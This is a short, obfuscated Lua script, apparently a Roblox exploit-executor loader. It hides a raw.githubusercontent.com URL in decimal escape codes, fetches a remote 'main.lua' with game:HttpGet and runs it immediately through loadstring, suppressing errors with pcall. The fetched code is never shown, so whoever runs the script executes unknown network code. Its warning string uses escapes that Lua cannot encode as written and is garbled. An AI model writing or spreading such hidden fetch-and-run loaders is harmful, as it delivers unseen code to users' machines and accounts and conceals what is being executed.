do
    local _0x1 = {
        "\104\116\116\112\115\58\47\47\114\97\119\46",
        "\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47",
        "\120\105\97\111\122\101\121\121\100\115\110\98\47\97\105\105\108\108\47\109\97\105\110\47"
    }

    local function _0x2(t)
        local s = ""
        for i,v in next,t do
            s = s .. v
        end
        return s
    end

    local _0x3 = _0x2(_0x1)

    local function _0x4(x)
        return loadstring(x)
    end

    local function _0x5(a,b)
        return a:HttpGet(b)
    end

    local function _0x6(n)
        local ok,res = pcall(function()
            return _0x5(game,_0x3 .. n .. "\46\108\117\97")
        end)

        if not ok then
            return warn("\21152\36733\22833\36133\58 "..n)
        end

        local f = _0x4(res)

        if f then
            return f()
        end
    end

    if getgenv().XiaoZeLoaded then
        return
    end

    getgenv().XiaoZeLoaded = true

    coroutine.wrap(function()
        pcall(function()
            _0x6("\109\97\105\110")
        end)
    end)()
end
